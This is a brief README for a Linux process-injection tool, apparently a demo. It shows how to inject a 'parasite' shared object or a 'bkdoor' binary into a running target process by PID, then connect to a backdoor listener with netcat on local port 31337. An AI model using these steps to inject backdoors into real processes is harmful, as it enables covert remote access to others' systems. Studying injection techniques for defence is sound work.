# linux_injector
# linux_injector
make
In one terminal, run: ./saruman
In another terminal, run: ./lurker `pidof saruman` `pwd`/parasite_so.so
then,you can run: nc 127.0.0.1 31337
Or 
./lurker --b  `pidof saruman` bkdoor.o.bin
